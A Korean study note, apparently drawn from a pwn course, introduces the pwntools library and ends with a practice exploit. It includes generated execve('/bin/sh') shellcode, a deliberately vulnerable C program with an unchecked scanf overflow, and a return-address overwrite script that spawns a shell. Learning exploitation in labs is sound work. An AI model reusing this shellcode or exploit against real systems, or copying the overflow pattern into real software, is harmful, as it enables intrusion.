# pwntools

---

## pwntools

- 간단한 프로그램에 대해서는 파이썬으로 공격 페이로드를 생성하고, 파이프를 통해 이를 프로그램에 전달하는 방식으로 익스플로잇을 수행
    - 여러개의 익스플로잇 스크립트에서 자주 사용하는 함수가 등장
        - ex) 리틀엔디언 ↔ 바이트 배열(패킹, 언패킹 함수)
    - 이를 집대성하여 ‘pwntools’라는 파이썬 모듈이 제작됨

### pwntools를 사용한 python Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

# Make TCP connection
r = remote('127.0.0.1', 31337)

# Build payload
payload = b''
payload += b'Socket script'
payload += b'\n'

# Send payload
r.send(payload)

# Print received data
data = r.recv(1024)
print(f'Received: {data}')
```

### pwntools 설치

https://github.com/Gallopsled/pwntools

```python
sudo apt-get update
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

### 1. process & remote

- `process` 함수는 로컬 바이너리 파일을 대상으로 익스플로잇을 대상으로 할 때 사용하는 함수
- `remote` 함수는 원격 서버를 대상으로 할 때 사용하는 함수
    - 전자는 보통 익스플로잇을 테스하고 디버깅하기위해, 후자는 실제로 공격하기 위해 사용

```python
from pwn import *
p = process('./test')  # 로컬 바이너리 'test'를 대상으로 익스플로잇 수행
p = remote('example.com', 31337)  # 'example.com'의 31337 포트에서 실행 중인 프로세스를 대상으로 익스플로잇 수행
```

### 2. send

- `send` 는 데이터를 프로세스에 전달하기 위해 사용

```python
from pwn import *
p = process('./test
p.send(b'A')  # ./test에 b'A'를 입력
p.sendline(b'A') # ./test에 b'A' + b'\n'을 입력
p.sendafter(b'hello', b'A')  # ./test가 b'hello'를 출력하면, b'A'를 입력
p.sendlineafter(b'hello', b'A')  # ./test가 b'hello'를 출력하면, b'A' + b'\n'을 입력
```

### 3. recv

- `recv` 는 프로세스로부터 데이터를 받기 위해 사용
    - `recv` 와 `recvn` 의 차이
        - `recv(n)` 은 최대 n바이트를 받는 것이므로, 그만큼을 받지못해도 에러가 발생하지 않지만, `recvn` 은 n바이트를 받지 못하면 계속 기다림

```python
from pwn import *
p = process('./test')

data = p.recv(1024)  # p가 출력하는 데이터를 최대 1024바이트까지 받아서 data에 저장
data = p.recvline()  # p가 출력하는 데이터를 개행문자를 만날 때까지 받아서 data에 저장
data = p.recvn(5)  # p가 출력하는 데이터를 5바이트만 받아서 data에 저장
data = p.recvuntil(b'hello')  # p가 b'hello'를 출력할 때까지 데이터를 수신하여 data에 저장
data = p.recvall()  # p가 출력하는 데이터를 프로세스가 종료될 때까지 받아서 data에 저장
```

### 4. packing & unpacking

- 익스플로잇을 작성하다보면 어떤 데이터를 리틀엔디언 바이트 배열로 바꾸거나, 그 역의 과정을 거쳐야하는 경우가 자주 있음
- pwntools에 `packing` `unpacking` 함수를 사용하면 간단하게 사용할 수 있음

```python
#!/usr/bin/env python3
# Name: pup.py

from pwn import *

s32 = 0x41424344
s64 = 0x4142434445464748

print(p32(s32))
print(p64(s64))

s32 = b"ABCD"
s64 = b"ABCDEFGH"

print(hex(u32(s32)))
print(hex(u64(s64)))
```

```python
$ python3 pup.py
b'DCBA'
b'HGFEDCBA'
0x44434241
0x4847464544434241
```

### 5. interactive

- 셸을 획득했거나, 익스플로잇의 특정 상황에 직접 입력을 주면서 상황을 확인해보고 싶을 때 사용하는 함수
- 호출하고 나면 터미널로 프로세스에 데이터를 입력하고, 프로세스의 출력을 확인할 수 있음

```python
from pwn import *
p = process('./test')
p.interactive()
```

### 6. ELF

- ELF 헤더에는 익스플로잇에 사용될 수 있는 각종 정보가 기록되어 있음
- `pwntools` 를 사용하면 이정보들을 쉽게 참조할 수 있음

```python
from pwn import *
e = ELF('./test')
puts_plt = e.plt['puts'] # ./test에서 puts()의 PLT주소를 찾아서 puts_plt에 저장
read_got = e.got['read'] # ./test에서 read()의 GOT주소를 찾아서 read_got에 저장
```

### 7. context.log

- 익스플로잇에서 발생하는 버그를 디버깅하기 위해 사용할 수 있음 → **로깅 사용**
- 로그 레벨은 `context.log_level` 변수로 조절 할 수 있음

```python
from pwn import *
context.log_level = 'error' # 에러만 출력
context.log_level = 'debug' # 대상 프로세스와 익스플로잇간에 오가는 모든 데이터를 화면에 출력
context.log_level = 'info'  # 비교적 중요한 정보들만 출력
```

### 8. context.arch

- `pwntools` 는 셸코드를 생성하거나, 코드를 어셈블, 디스 어셈블하는 기능 등을 가지고 있는데, 이들은 공격 대상의 아키텍처의 영향을 받음
- 그래서 `pwntools` 는 아키텍처 정보를 프로그래머가 지정할 수 있게 하며, 이 값에 따라 몇몇 함수들의 동작이 달라짐

```python
from pwn import *
context.arch = "amd64" # x86-64 아키텍처
context.arch = "i386"  # x86 아키텍처
context.arch = "arm"   # arm 아키텍처
```

### 9. shellcraft

- pwntools에는 자주 사용되는 셸 코드들이 저장되어 있어서, 공격에 필요한 셸 코드를 쉽게 꺼내 쓸 수 있게 해줌
- 매우 편리한 기능이지만 정적으로 생성된 셸 코드는 셸 코드가 실행될 때의 메모리 상태를 반영하지 못함
- 또한, 프로그램에 따라 입력할 수 있는 셸 코드의 길이나, 구성 가능한 문자의 종류에 제한이 있을 수 있는데, 이런 조건들도 반영하기 어려움 → 따라서 제약 조건이 존재하는 상황에서는 직접 셸 코드를 작성하는 것이 좋음

```python
#!/usr/bin/env python3
# Name: shellcraft.py

from pwn import *
context.arch = 'amd64' # 대상 아키텍처 x86-64

code = shellcraft.sh() # 셸을 실행하는 셸 코드 
print(code)
```

```python
$ python3 shellcraft.py
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    ...
    syscall
```

### 10. asm

- `pwntools` 는 어셈블 기능을 제공함 → 해당 기능도 대상 아키텍처가 중요함(지정 필요)

```python
#!/usr/bin/env python3
# Name: asm.py

from pwn import *
context.arch = 'amd64' # 익스플로잇 대상 아키텍처 'x86-64'

code = shellcraft.sh() # 셸을 실행하는 셸 코드
code = asm(code)       # 셸 코드를 기계어로 어셈블
print(code)
```

```python
$ python3 asm.py
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
```

## pwntools 실습

## rao 익스플로잇

- Test용 바이너리 파일(`rao.c`)

```python
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <unistd.h>
void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};
  execve(cmd, args, NULL);
}
int main() {
  char buf[0x28];
  printf("Input: ");
  scanf("%s", buf);
  return 0;
}
```

- rao 예제코드(`rao.py` )

```python
#!/usr/bin/python3
#Name: rao.py

from pwn import *          # Import pwntools module

p = process('./rao')       # Spawn process './rao'

elf = ELF('./rao')
get_shell = elf.symbols['get_shell']       # The address of get_shell()

payload = b'A'*0x30        #|       buf      |  <= 'A'*0x30
payload += b'B'*0x8        #|       SFP      |  <= 'B'*0x8
payload += p64(get_shell)  #| Return address |  <= '\xaa\x06\x40\x00\x00\x00\x00\x00'

p.sendline(payload)        # Send payload to './rao'

p.interactive()            # Communicate with shell
```

```python
$ python3 rao.py
[+] Starting local process './rao': pid 416
[*] Switching to interactive mode
$ id
uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack) ...
```